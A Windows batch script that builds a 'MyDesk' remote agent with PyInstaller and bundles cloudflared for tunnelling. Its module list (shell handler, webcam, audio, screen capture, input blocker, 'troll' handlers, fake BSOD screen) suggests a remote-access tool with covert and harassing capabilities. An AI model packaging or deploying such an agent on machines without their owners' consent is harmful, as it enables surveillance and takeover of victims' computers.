@echo off
setlocal
cd /d "%~dp0.."

echo ==========================================
echo       MyDesk BUILD SYSTEM (Optimized)
echo ==========================================

:: 1. Cleanup (keep spec file for faster rebuilds)
if exist dist (
    rmdir /s /q dist
    if exist dist (
        echo [!] ERROR: Could not clean 'dist' folder. Is it open in Sandbox or Explorer?
        pause
        exit /b
    )
)
@REM if exist build rmdir /s /q build
mkdir dist

:: 2. Dependencies (numpy, msgpack for optimizations)
echo [*] Checking Dependencies...
@REM Reset errorlevel before check since pip install is commented out
ver > nul
@REM python -m pip install ...
if %errorlevel% neq 0 (
    echo [!] Failed to install dependencies!
    pause
    exit /b
)

:: 3. Custom Config Check
echo.
echo [*] Checking Pre-Baked Config...
echo    If you haven't edited "scripts/install_agent.py" with your URLs,
echo    the Intent will prompt the user (Interactive Mode).
echo.

@REM :: ==========================================
@REM :: BUILD CONFIGURATION
@REM :: ==========================================
@REM set AGENT_NAME=MyDeskAgent
@REM set VIEWER_NAME=MyDeskViewer
@REM set SETUP_NAME=MyDeskSetup

@REM :: Icon Path (Optional - Place 'icon.ico' in scripts folder)
@REM set ICON_PATH=scripts\icon.ico
@REM set ICON_FAG=
@REM if exist "%ICON_PATH%" (
@REM     echo [+] Icon found: %ICON_PATH%
@REM     set ICON_FLAG=--icon="%ICON_PATH%"
@REM ) else (
@REM     echo [-] No icon found at %ICON_PATH% (Using default)
@REM )

@REM :: Version Info (Optional - Edit 'scripts\version_info.txt')
@REM set VERSION_PATH=scripts\version_info.txt
@REM set VERSION_FLAG=
@REM if exist "%VERSION_PATH%" (
@REM     echo [+] Version info found: %VERSION_PATH%
@REM     set VERSION_FLAG=--version-file="%VERSION_PATH%"
@REM ) else (
@REM     echo [-] No version info found at %VERSION_PATH%
@REM )

:: 4. Build AGENT (Optimized - uses --noupx for faster build)
echo [*] Building 1/3: exe...
python -m PyInstaller --console --onefile --noupx --name MydeskAgent ^
    --exclude-module matplotlib ^
    --exclude-module pandas ^
    --exclude-module scipy ^
    --exclude-module PyQt6 ^
    --exclude-module torch ^
    --exclude-module streamlit ^
    --exclude-module altair ^
    --exclude-module flask ^
    --exclude-module selenium ^
    --exclude-module sklearn ^
    --exclude-module pyarrow ^
    --exclude-module ipython ^
    --exclude-module jupyter ^
    --exclude-module chess ^
    --exclude-module google ^
    --exclude-module pywinauto ^
    --exclude-module uiautomation ^
    --exclude-module nodriver ^
    --exclude-module pynput ^
    --hidden-import=targets.input_controller ^
    --hidden-import=targets.privacy ^
    --hidden-import=targets.capture ^
    --hidden-import=targets.audio ^
    --hidden-import=targets.webcam ^
    --hidden-import=targets.auditor ^
    --hidden-import=targets.shell_handler ^
    --hidden-import=targets.process_manager ^
    --hidden-import=targets.file_manager ^
    --hidden-import=targets.clipboard_handler ^
    --hidden-import=targets.device_settings ^
    --hidden-import=targets.troll_handler ^
    --hidden-import=targets.troll_video_player ^
    --hidden-import=targets.bsod_screen ^
    --hidden-import=targets.webrtc_handler ^
    --hidden-import=targets.webrtc_tracks ^
    --hidden-import=targets.resource_manager ^
    --hidden-import=targets.tunnel_manager ^
    --hidden-import=targets.kiosk ^
    --hidden-import=targets.input_blocker ^
    --hidden-import=pyaudiowpatch ^
    --hidden-import=aiortc ^
    --hidden-import=aiortc.codecs ^
    --hidden-import=aiortc.codecs.h264 ^
    --hidden-import=aiortc.contrib.media ^
    --hidden-import=av ^
    --hidden-import=av.video ^
    --hidden-import=av.audio ^
    --hidden-import=numpy ^
    --hidden-import=msgpack ^
    --hidden-import=PIL.Image ^
    --hidden-import=cv2 ^
    --hidden-import=requests ^
    --hidden-import=psutil ^
    --hidden-import=targets.tunnel_manager ^
    --hidden-import=targets.kiosk ^
    --hidden-import=pillow_jxl ^
    --hidden-import=zstandard ^
    --add-data "targets;targets" ^
    agent_loader.py
if %errorlevel% neq 0 goto fail

@REM :: 5. Build SETUP (Bundle)
@REM echo.
@REM echo [*] Building 2/3: %SETUP_NAME%.exe (Installer Bundle)...
@REM python -m PyInstaller --noconsole --onefile --noupx --name %SETUP_NAME% %ICON_FLAG% %VERSION_FLAG% --add-binary "dist/%AGENT_NAME%.exe;." scripts/install_agent.py
@REM if %errorlevel% neq 0 goto fail

@REM :: 6. Build VIEWER
@REM echo.
@REM echo [*] Building 3/3: %VIEWER_NAME%.exe (Client App)...
@REM python -m PyInstaller --noconsole --onefile --noupx --name %VIEWER_NAME% %ICON_FLAG% %VERSION_FLAG% ^
@REM     --hidden-import=PyQt6.QtCore ^
@REM     --hidden-import=PyQt6.QtGui ^
@REM     --hidden-import=PyQt6.QtWidgets ^
@REM     viewer/main.py
@REM if %errorlevel% neq 0 goto fail

echo.
echo [*] Copying Cloudflared...
if not exist "cloudflared.exe" (
    echo [!] ERROR: cloudflared.exe not found in root folder!
    goto fail
)
copy /Y "cloudflared.exe" "dist\cloudflared.exe"
if %errorlevel% neq 0 goto fail

echo.
echo ==========================================
echo         BUILD COMPLETE!
echo ==========================================
echo Output Files (in \MyDesk\dist):
echo 1. %AGENT_NAME%.exe  (Standalone Agent)
@REM echo 2. %SETUP_NAME%.exe  (Installer Bundle)
@REM echo 3. %VIEWER_NAME%.exe (Client App)
echo.
@REM pause
exit /b

:fail
echo.
echo [!] BUILD FAILED. Check errors above.
@REM pause
exit /b
